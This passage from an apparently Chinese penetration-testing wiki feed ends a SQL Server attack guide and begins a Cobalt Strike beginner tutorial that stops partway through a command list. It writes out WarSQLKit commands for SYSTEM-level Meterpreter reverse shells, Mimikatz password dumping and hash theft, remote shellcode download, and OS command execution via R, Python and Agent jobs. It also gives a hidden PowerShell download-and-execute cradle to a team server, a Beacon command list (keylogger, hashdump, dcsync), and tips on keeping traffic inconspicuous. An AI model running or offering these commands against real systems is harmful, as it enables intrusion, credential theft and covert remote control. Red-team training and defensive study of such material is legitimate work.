src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-2.png"></p><p>以SYSTEM权限运行PowerShell命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;powershell Get-ChildItem /RunSystemPS&#x27;;</span><br></pre></td></tr></table></figure><p>以SYSTEM权限运行的X86 Meterpreter反向连接shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_reverse_tcp LHOST LPORT GetSystem&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-3.png"></p><p>生成以SYSTEM权限运行的X64 Meterpreter反向连接shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_x64_meterpreter_reverse_tcp LHOST LPORT GetSystem&#x27;;</span><br></pre></td></tr></table></figure><p>生成以SYSTEM权限运行的X64 Meterpreter RC4反向连接shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_reverse_rc4 LHOST LPORT GetSystem&#x27;</span><br><span class="line">RC4PASSWORD=123456</span><br></pre></td></tr></table></figure><p>生成以SYSTEM权限运行的X86 Meterpreter_bind_tcp shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_meterpreter_bind_tcp LPORT GetSystem&#x27;;</span><br></pre></td></tr></table></figure><p>每次使用 Meterpreter反弹都会创建一个reverse进程</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-4.png"></p><p>运行Mimikatz功能抓取密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec &#x27;sp_Mimikatz&#x27;;</span><br><span class="line">select * from WarSQLKitTemp //获取Mimikatz日志</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-15.png"></p><p>文件下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_downloadFile http://test.com/Invoke--Shellcode.ps1 C:\test\Invoke--Shellcode.ps1 300&#x27;;</span><br><span class="line">EXEC sp_cmdExec &#x27;sp_downloadFile http://10.251.0.33/Invoke--Shellcode.ps1 C:\test\Invoke--Shellcode.ps1 300&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-14.png"></p><p>获取MSSQL Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_getSqlHash&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-5.png"></p><p>获取Windows Product</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_getProduct&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-6.png"></p><p>获取可用的数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_cmdExec &#x27;sp_getDatabases&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-7.png"></p><h2 id="SQL-Server-R和Python的利用"><a href="#SQL-Server-R和Python的利用" class="headerlink" title="SQL Server R和Python的利用"></a>SQL Server R和Python的利用</h2><p>MSSQL 2017加入了Microsoft机器学习服务，该服务允许通过MSSQL中<code>sp_execute_external_script</code>执行Python和R脚本</p><p>利用条件：</p><ul><li><p>Machine Learning Services必须要在Python安装过程中选择</p></li><li><p>必须启用外部脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;external scripts enabled&#x27;, 1</span><br><span class="line">RECONFIGURE WITH OVERRIDE</span><br></pre></td></tr></table></figure><ul><li>重新启动数据库服务器</li></ul></li><li><p>用户拥有执行任何外部脚本权限</p></li></ul><h3 id="R脚本利用"><a href="#R脚本利用" class="headerlink" title="R脚本利用"></a>R脚本利用</h3><p>利用R执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sp_configure &#x27;external scripts enabled&#x27;</span><br><span class="line">GO</span><br><span class="line">EXEC sp_execute_external_script</span><br><span class="line">@language=N&#x27;R&#x27;,</span><br><span class="line">@script=N&#x27;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe</span><br><span class="line">/c dir&quot;,intern=T))&#x27;</span><br><span class="line">WITH RESULT SETS (([cmd_out] text));</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>利用R抓取Net-NTLM哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@script=N&#x27;.libPaths(&quot;\\\\testhost\\foo\\bar&quot;);library(&quot;0mgh4x&quot;)&#x27;</span><br></pre></td></tr></table></figure><h3 id="Python脚本利用"><a href="#Python脚本利用" class="headerlink" title="Python脚本利用"></a>Python脚本利用</h3><p>Python ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec sp_execute_external_script </span><br><span class="line">@language =N&#x27;Python&#x27;,</span><br><span class="line">@script=N&#x27;import sys</span><br><span class="line">OutputDataSet = pandas.DataFrame([sys.version])&#x27;</span><br><span class="line">WITH RESULT SETS ((python_version nvarchar(max)))</span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exec sp_execute_external_script </span><br><span class="line">@language =N&#x27;Python&#x27;,</span><br><span class="line">@script=N&#x27;import subprocess</span><br><span class="line">p = subprocess.Popen(&quot;cmd.exe /c whoami&quot;, stdout=subprocess.PIPE)</span><br><span class="line">OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])&#x27;</span><br><span class="line">WITH RESULT SETS (([cmd_out] nvarchar(max)))</span><br></pre></td></tr></table></figure><h2 id="SQL-Server代理执行计划任务"><a href="#SQL-Server代理执行计划任务" class="headerlink" title="SQL Server代理执行计划任务"></a>SQL Server代理执行计划任务</h2><h3 id="启动SQL-Server代理服务"><a href="#启动SQL-Server代理服务" class="headerlink" title="启动SQL Server代理服务"></a>启动SQL Server代理服务</h3><p>SQL Server代理是一项Microsoft Windows服务，它执行计划的管理任务。</p><p>首先启动SQL Server代理服务。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-8.png"></p><h3 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">USE msdb; </span><br><span class="line">EXEC dbo.sp_add_job @job_name = N&#x27;test_powershell_job1&#x27;; </span><br><span class="line">EXEC sp_add_jobstep @job_name = N&#x27;test_powershell_job1&#x27;, @step_name = N&#x27;test_powershell_name1&#x27;, @subsystem = N&#x27;PowerShell&#x27;, @command = N&#x27;c:\windows\system32\cmd.exe /c whoami /all &gt;c:\\123.txt&#x27;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#x27;test_powershell_job1&#x27;; </span><br><span class="line">EXEC dbo.sp_start_job N&#x27;test_powershell_job1&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/WarSQLKit-9.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm">https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm</a></li><li><a href="http://www.freetds.org/">http://www.freetds.org/</a></li><li><a href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></li><li><a href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/</a></li><li><a href="https://xz.aliyun.com/t/7534">https://xz.aliyun.com/t/7534</a></li><li><a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></li><li><a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by Tahir 2021.3.5&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;SQL-Server概述&quot;&gt;&lt;a href=&quot;#SQL-Server概述&quot; class=&quot;headerlink&quot; title=&quot;SQL Server概述&quot;</summary>
      
    
    
    
    <category term="数据库攻防" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/"/>
    
    <category term="SQL Server" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL-Server/"/>
    
    
    <category term="SQL Server" scheme="http://example.com/tags/SQL-Server/"/>
    
  </entry>
  
  <entry>
    <title>0-Cobalt Strike零基础</title>
    <link href="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/</id>
    <published>2021-06-28T11:59:00.000Z</published>
    <updated>2021-06-30T03:06:20.345Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-Cobalt-Strike-简介"><a href="#1-Cobalt-Strike-简介" class="headerlink" title="1.Cobalt Strike 简介"></a>1.Cobalt Strike 简介</h2><p>Cobalt Strike 是一款GUI的框架式渗透工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，win exe木马生成，win dll木马生成，java木马生成，office宏病毒生成，木马捆绑；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。</p><p>Cobalt Strike: C/S架构的商业渗透软件，适合多人进行团队协作，可模拟APT做模拟对抗，进行内网渗透。</p><p><strong>CS的发展</strong></p><ul><li><p>Armitage [2010-2012]</p><p>Armitage是一个红队协作攻击管理工具，它以图形化方式实现了Metasploit框架的自动化攻击。Armitage采用Java构建，拥有跨平台特性。</p></li><li><p>Cobalt Strike 1.x [2012-2014]</p><p>Cobalt Strike 增强了Metasploit Framework在执行目标攻击和渗透攻击的能力。</p></li><li><p>Cobalt Strike 2.x [2014-?]</p><p>Cobalt Strike 2是应模拟黑客攻击的市场需求而出现的，Cobalt Strike 2是以malleable C2技术的需求为定位的，这个技术使Cobalt Strike的能力更强了一些。</p></li><li><p>Cobalt Strike 3.x [2015-?]</p><p>Cobalt Strike 3 的攻击和防御都不用在Metasploit Framework平台（界面）下进行。</p><p>如今 Cobalt Strike 4.0 也已经发布，改动相比 3.x 还是不小的，笔者在演示的时候使用的 Cobalt Strike 4.0，看的视频教程是 3.x 的教程。</p></li></ul><p><strong>接下来会用到的工具和环境</strong></p><ul><li>Cobalt Strike</li><li>Kali</li><li>Metasploit Framework</li><li>PowerSploit</li><li>PowerTools</li><li>Veil Evasion Framework</li></ul><h2 id="2-Cobalt-Strike-安装"><a href="#2-Cobalt-Strike-安装" class="headerlink" title="2.Cobalt Strike 安装"></a>2.Cobalt Strike 安装</h2><h3 id="2-1-安装Java运行环境"><a href="#2-1-安装Java运行环境" class="headerlink" title="2.1 安装Java运行环境"></a>2.1 安装Java运行环境</h3><p>因为启动Cobalt Strike需要JDK的支持，所以需要安装Java环境。Java环境的安装可以参考：<a href="https://www.runoob.com/java/java-environment-setup.html">https://www.runoob.com/java/java-environment-setup.html</a></p><p>因为安装kali时，默认会安装java环境。我们可以通过java -version进行验证。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/1.png"></p><h3 id="2-2-部署TeamServer"><a href="#2-2-部署TeamServer" class="headerlink" title="2.2 部署TeamServer"></a>2.2 部署TeamServer</h3><p>在安装Cobalt Strike时，必须搭建团队服务器（TeamServer服务器）。打开cobaltstrike文件夹，赋予TeamServer 和 Cabalt Strike执行权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x teamserver cobaltstrike</span><br></pre></td></tr></table></figure><p>Cobalt Strike 文件夹中有多个文件和文件夹。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/2.png"></p><p>其功能如下。</p><ul><li>agscript：拓展应用的脚本。</li><li>c2lint：用于检查profile 的错误和异常。</li><li>teamserver：团队服务器程序。</li><li>cobaltstrike 和 cobaltstrike.jar:客户端程序。因为teamserver文件是通过Java来调用CobaltStrike 的，所以直接在命令行环境中输入第一个文件的内容也能启动Cobalt Strike 客户端 (主要是为了方便操作)。</li><li>logs:日志，包括 Web日志、Beacon日志、截图日志、下载日志、键盘记录日志等。</li><li>datas：用于保存当前TeamServer的一些数据。</li><li>update 和 update.jar：用于更新Cobalt Strike。</li></ul><p>最后，运行团队服务器。需要设置当前主机的IP地址和TeamServer的密码。输入如下命令启动TeamServer。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver 10.251.0.35 sangfor</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/3.png"></p><p>Cobalt Strike的TeamServer准备就绪。接下来，我们就可以启动Cobalt Strike客户端来连接TeamServer了。</p><h2 id="3-Cobalt-Strike-启动"><a href="#3-Cobalt-Strike-启动" class="headerlink" title="3.Cobalt Strike 启动"></a>3.Cobalt Strike 启动</h2><h3 id="3-1-启动cobaltstrike-jar"><a href="#3-1-启动cobaltstrike-jar" class="headerlink" title="3.1 启动cobaltstrike.jar"></a>3.1 启动cobaltstrike.jar</h3><p>在Linux下，可以直接通过./cobaltstrike启动客户端，如下图。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cobaltstrike</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/4.png"></p><p>填写TeamServer的IP地址、端口号、用户名、密码。在这里，登录的用户名可以任意输名称，只要保证当前该用户名没有被用来登录Cobalt Strike服务器即可。</p><p>在确认信息填写无误后，点击Connect连接服务端，这时候会出现指纹校验对话框。指纹校验的主要作用是防篡改，且每次创建Cobalt Strike团队服务器时生成的指纹都不一样。</p><p>在客户端向服务器成功获取相关信息后，即可打开Cobalt Strike 主页面，Cobalt Strike 主页面主要分为菜单栏、快捷功能区、目标列表区、控制台命令输出区、控制台命令输入区。</p><ul><li>菜单栏：集成了Cobalt Strike的所有功能。</li><li>快捷功能区：列出常用的功能。</li><li>目标列表：根据不同的显示模式，显示已获取权限的主机及目标主机。</li><li>控制台命令输出区：输出命令的执行结果。</li><li>控制台命令输人区：输入命令。</li></ul><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/5.png"></p><p>Windows中，可以直接允许.bat程序，然后输入teamserver服务器的IP地址和密码进行连接即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/6.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/8.png"></p><h3 id="3-2-利用Cobalt-Strike-获取第一个Beacon"><a href="#3-2-利用Cobalt-Strike-获取第一个Beacon" class="headerlink" title="3.2 利用Cobalt Strike 获取第一个Beacon"></a>3.2 利用Cobalt Strike 获取第一个Beacon</h3><p><strong>建立Listener</strong></p><p>可以通过菜单栏的第一个选项”Cobalt Strike”进人”Listeners” 面板，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/9.png"></p><p>也可以通过快捷功能区进入”Listeners” 面板，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/10.png"></p><p>单击“Add” 按钮，新建一个监听器，输入名称、监听器类型、团队服务器IP地址、监听的端口，然后单击“Save”按钮保存设置。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/0.png"></p><p><strong>使用 Web Delivery 执行Payload</strong></p><p>单击 “Attacks” 菜单，选择”Web Drive-by”→”Scripted Web Delivery”选项，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/12.png"></p><p>或者通过快捷功能区，打开“Scripted Web Delivery”窗口，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/13.png"></p><p>保持默认配置，选择已经创建的监听器，设置类型为PowerShell,然后单击“Launch”按钮，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/14.png"></p><p>最后，将Cobalt Strike生成的Payload完整地复制下来，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/15.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://10.251.0.35:80/a&#x27;))&quot;</span><br></pre></td></tr></table></figure><p>其中url它是个文件路径，就是让目标 （受害者）通过这个地址和端口下载 恶意脚本。访问这个url，可以看到是一段powershell代码，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/16.png"></p><p><strong>在目标机器上执行Payload</strong></p><p>执行Payload，Cobalt Strike 会收到一个Beacon，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/17.png"></p><p>执行以后，可以在Cobalt Strike的日志里面看到一条日志，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/18.png"></p><p>在Cobalt Strike 的主页面中可以看到一台机器上线（包含外网IP地址，内网IP地址、监听器、用户名、机器名、是否有特权、Beacon进程的PID、心跳时间等信息），如下图:</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/19.png"></p><p><strong>与目标主机进行交互操作</strong></p><p>单击右键，在弹出的快捷菜单中选中需要操作的Beacon，然后单击”Interact”选项，进入主机交互模式，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/20.png"></p><p>现在就可以输入一些命令来执行相关操作了。输入”shell whoami”命令,查看当前用户，在心跳时间后就会执行该命令。在执行命令时，需要在命令前添加”shell”。Beacon的每次回连时间默认为60秒。如果sleep时间过长，在下载文件面前更为明显，所以在测试时会把时间降低一点 。拿到Beacon后，我一般先执行sleep 5，大家可以根据实战环境来调节，建议不要太快，不然流量会很明显。回连后，执行命令的任务将被下发，并成功回显命令的执行结果，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/21.png"></p><p>其他的Beacon命令，大家可以在Beacon中输入help来获取。在这贴出一部分汉化的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">Beacon Commands</span><br><span class="line"> Command Description</span><br><span class="line"> ------- -----------</span><br><span class="line"> browserpivot 注入受害者浏览器进程</span><br><span class="line"> bypassuac 绕过UAC</span><br><span class="line"> cancel 取消正在进行的下载</span><br><span class="line"> cd 切换目录</span><br><span class="line"> checkin 强制让被控端回连一次</span><br><span class="line"> clear 清除beacon内部的任务队列</span><br><span class="line"> connect Connect to a Beacon peer over TCP</span><br><span class="line"> covertvpn 部署Covert VPN客户端</span><br><span class="line"> cp 复制文件</span><br><span class="line"> dcsync 从DC中提取密码哈希</span><br><span class="line"> desktop 远程VNC</span><br><span class="line"> dllinject 反射DLL注入进程</span><br><span class="line"> dllload 使用LoadLibrary将DLL加载到进程中</span><br><span class="line"> download 下载文件</span><br><span class="line"> downloads 列出正在进行的文件下载</span><br><span class="line"> drives 列出目标盘符</span><br><span class="line"> elevate 尝试提权</span><br><span class="line"> execute 在目标上执行程序(无输出)</span><br><span class="line"> execute-assembly 在目标上内存中执行本地.NET程序</span><br><span class="line"> exit 退出beacon</span><br><span class="line"> getprivs Enable system privileges on current token</span><br><span class="line"> getsystem 尝试获取SYSTEM权限</span><br><span class="line"> getuid 获取用户ID</span><br><span class="line"> hashdump 转储密码哈希值</span><br><span class="line"> help 帮助</span><br><span class="line"> inject 在特定进程中生成会话</span><br><span class="line"> jobkill 杀死一个后台任务</span><br><span class="line"> jobs 列出后台任务</span><br><span class="line"> kerberos_ccache_use 从ccache文件中导入票据应用于此会话</span><br><span class="line"> kerberos_ticket_purge 清除当前会话的票据</span><br><span class="line"> kerberos_ticket_use 从ticket文件中导入票据应用于此会话</span><br><span class="line"> keylogger 键盘记录</span><br><span class="line"> kill 结束进程</span><br><span class="line"> link Connect to a Beacon peer over a named pipe</span><br><span class="line"> logonpasswords 使用mimikatz转储凭据和哈希值</span><br><span class="line"> ls 列出文件</span><br><span class="line"> make_token 创建令牌以传递凭据</span><br><span class="line"> mimikatz 运行mimikatz</span><br><span class="line"> mkdir 创建一个目录</span><br><span class="line"> mode dns 使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line"> mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line"> mode http 使用HTTP作为通信通道</span><br><span class="line"> mv 移动文件</span><br><span class="line"> net net命令</span><br><span class="line"> note 备注 </span><br><span class="line"> portscan 进行端口扫描</span><br><span class="line"> powerpick 通过Unmanaged 